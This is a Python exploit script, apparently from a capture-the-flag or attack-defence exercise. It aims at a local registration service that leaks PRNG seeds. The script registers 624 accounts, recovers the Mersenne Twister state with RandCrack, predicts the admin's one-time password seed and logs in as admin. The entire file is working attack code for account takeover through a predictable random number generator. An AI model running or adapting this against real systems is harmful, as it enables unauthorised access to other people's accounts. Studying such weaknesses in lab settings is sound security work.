import requests as r
import zlib
import crypto
import re
from randcrack import RandCrack
import sys

rc = RandCrack()
r0 = re.compile(r"seed (\d+) and first password (\d+)")
r1 = re.compile(r"and first password (\d+)")
bu = "http://127.0.0.1:20007/"
bname = "exploit_" + sys.argv[1] + "_name_{0}"
s = r.Session()

for i in range(0, 624):
    try:
        d0 = s.post(bu + "register", data={"login": bname.format(i)})
    except r.exceptions.ConnectionError:
        d0 = s.post(bu + "register", data={"login": bname.format(i)})
    if "exists" in d0.text:
        print("watafack")
        exit(1)

    rd0 = r0.search(d0.text)
    if not rd0:
        print("watafack 1")
        print(d0.text)
        exit(1)

    seed = int(rd0.group(1))
    pasw = int(rd0.group(2))
    u = crypto.User(seed=seed)
    if u.gen_pass() != pasw:
        print("watafack 2")
        exit(1)

    bseed = zlib.crc32(bname.format(i).encode())
    theor_value = seed - bseed
    print(f"Thror: {theor_value} from {seed} - {bseed}\t\tDone {round(i/624 * 100, 3)}% ({i}/624)")
    rc.submit(theor_value)

print("Let's predict!")
try:
    d1 = s.post(bu + "regen", data={"login": "admin", "otp": "-1"})
except r.exceptions.ConnectionError:
    d1 = s.post(bu + "regen", data={"login": "admin", "otp": "-1"})
if "exists" in d1.text:
    print("watafack")
    exit(1)

rd1 = r1.search(d1.text)
if not rd1:
    print("watafack 1")
    print(d1.text)
    exit(1)

tr = rc.predict_randint(0, 4294967294)
admin = crypto.User(seed=zlib.crc32("admin".encode()) + tr)
print(f"Theor random int = {tr}, passw_from = {rd1.group(1)}, passw_our = {admin.gen_pass()}")

d2 = s.post(bu + "login", data={"login": "admin", "otp": admin.gen_pass()})
print(d2.text)
